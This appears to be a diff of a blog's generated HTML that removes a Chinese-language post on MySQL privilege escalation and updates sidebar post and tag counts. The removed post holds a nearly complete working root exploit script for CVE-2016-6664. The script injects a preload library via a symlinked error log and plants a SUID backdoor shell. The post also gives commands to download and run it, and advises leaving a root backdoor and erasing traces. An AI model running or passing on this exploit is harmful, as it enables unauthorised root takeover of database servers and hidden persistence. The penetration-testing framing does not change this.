$ERRORLOG</span><br><span class="line">    touch $ERRORLOG</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo -n &gt; /etc/ld.so.preload</span><br><span class="line">    fi</span><br><span class="line">    echo -e &quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><br><span class="line">    exit $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function ctrl_c() &#123;</span><br><span class="line">        echo -e &quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&quot;</span><br><span class="line">    cleanexit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#intro </span><br><span class="line">echo -e &quot;\033[94m \nMySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / OCVE-2016-5617\n&quot;</span><br><span class="line">echo -e &quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&quot;</span><br><span class="line"></span><br><span class="line"># Args</span><br><span class="line">if [ $# -lt 1 ]; then</span><br><span class="line">    echo -e &quot;\n[!] Exploit usage: \n\n$0 path_to_error.log \n&quot;</span><br><span class="line">    echo -e &quot;It seems that this server uses: `ps aux | grep mysql | awk -F&apos;log-error=&apos; &apos;&#123; print $2 &#125;&apos; | cut -d&apos; &apos; -f1 | grep &apos;/&apos;`\n&quot;</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Priv check</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n[+] Starting the exploit as \n\033[94m`id`\033[0m&quot;</span><br><span class="line">id | grep -q mysql </span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e &quot;\n[!] You need to execute the exploit as mysql user! Exiting.\n&quot;</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Set target paths</span><br><span class="line">ERRORLOG=&quot;$1&quot;</span><br><span class="line">if [ ! -f $ERRORLOG ]; then</span><br><span class="line">    echo -e &quot;\n[!] The specified MySQL catalina.out log ($ERRORLOG) doesn&apos;t exist. Try again.\n&quot;</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] Target MySQL log file set to $ERRORLOG&quot;</span><br><span class="line"></span><br><span class="line"># [ Active exploitation ]</span><br><span class="line"></span><br><span class="line">trap ctrl_c INT</span><br><span class="line"># Compile privesc preload library</span><br><span class="line">echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><br><span class="line">cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">       #include &lt;sys/types.h&gt;</span><br><span class="line">       #include &lt;sys/stat.h&gt;</span><br><span class="line">       #include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">uid_t geteuid(void) &#123;</span><br><span class="line">    static uid_t  (*old_geteuid)();</span><br><span class="line">    old_geteuid = dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span><br><span class="line">    if ( old_geteuid() == 0 ) &#123;</span><br><span class="line">        chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span><br><span class="line">        chmod(&quot;$BACKDOORPATH&quot;, 04777);</span><br><span class="line">        //unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return old_geteuid();</span><br><span class="line">&#125;</span><br><span class="line">_solibeof_</span><br><span class="line">/bin/bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><br><span class="line">    cleanexit 2;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Prepare backdoor shell</span><br><span class="line">cp $BACKDOORSH $BACKDOORPATH</span><br><span class="line">echo -e &quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&quot;</span><br><span class="line"></span><br><span class="line"># Safety check</span><br><span class="line">if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">    echo -e &quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Symlink the log file to /etc</span><br><span class="line">rm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e &quot;\n[!] Couldn&apos;t remove the $ERRORLOG file or create a symlink.&quot;</span><br><span class="line">    cleanexit 3</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] Symlink created at: \n`ls -l $ERRORLOG`&quot;</span><br><span class="line"></span><br><span class="line"># Wait for MySQL to re-open the logs</span><br><span class="line">echo -ne &quot;\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n&quot;</span><br><span class="line">read -p &quot;Do you want to kill mysqld process to instantly get root? :) ? [y/n] &quot; THE_ANSWER</span><br><span class="line">if [ &quot;$THE_ANSWER&quot; = &quot;y&quot; ]; then</span><br><span class="line">    echo -e &quot;Got it. Executing &apos;killall mysqld&apos; now...&quot;</span><br><span class="line">    killall mysqld</span><br><span class="line">fi</span><br><span class="line">while :; do </span><br><span class="line">    sleep 0.1</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">        rm -f $ERRORLOG</span><br><span class="line">        break;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"># /etc/    dir should be owned by mysql user at this point</span><br><span class="line"># Inject the privesc.so shared library to escalate privileges</span><br><span class="line">echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">echo -e &quot;\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`&quot;</span><br><span class="line">echo -e &quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&quot;</span><br><span class="line">echo -e &quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span><br><span class="line">chmod 755 /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><br><span class="line">echo -e &quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><br><span class="line">sudo 2&gt;/dev/null &gt;/dev/null</span><br><span class="line"></span><br><span class="line">#while :; do </span><br><span class="line">#    sleep 0.1</span><br><span class="line">#    ps aux | grep mysqld | grep -q &apos;log-error&apos;</span><br><span class="line">#    if [ $? -eq 0 ]; then</span><br><span class="line">#        break;</span><br><span class="line">#    fi</span><br><span class="line">#done</span><br><span class="line"></span><br><span class="line"># Check for the rootshell</span><br><span class="line">ls -l $BACKDOORPATH</span><br><span class="line">ls -l $BACKDOORPATH | grep rws | grep -q root</span><br><span class="line">if [ $? -eq 0 ]; then </span><br><span class="line">    echo -e &quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&quot;</span><br><span class="line">    echo -e &quot;\n\033[94mGot root! The database server has been ch-OWNED !\033[0m&quot;</span><br><span class="line">else</span><br><span class="line">    echo -e &quot;\n[!] Failed to get root&quot;</span><br><span class="line">    cleanexit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Execute the rootshell</span><br><span class="line">echo -e &quot;\n[+] Spawning the rootshell $BACKDOORPATH now! \n&quot;</span><br><span class="line">$BACKDOORPATH -p -c &quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&quot;</span><br><span class="line">$BACKDOORPATH -p</span><br><span class="line"></span><br><span class="line"># Job done.</span><br><span class="line">cleanexit 0</span><br></pre></td></tr></table></figure></p>
-<p>然后我们在刚才mysql权限的shell中下载提权脚本并执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh</span><br><span class="line">chmod 777 mysql-chowned.sh</span><br><span class="line">./mysql-chowned.sh /var/log/mysql/error.log</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv13.png?raw=true" alt=""></p>
-<p>成功得到root权限</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv14.png?raw=true" alt=""></p>
-<p>接下来利用root账户留后门，清理痕迹即可。</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>数据库提权是后渗透阶段非常常用的提权方式，做渗透测试时，数据库是重要的突破点，只有我们对这些漏洞有一定的积累，才能面对不同的情况利用不同的漏洞。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2634,7 +2563,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">78</span>
+                <span class="site-state-item-count">79</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2656,7 +2585,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">55</span>
+                <span class="site-state-item-count">56</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
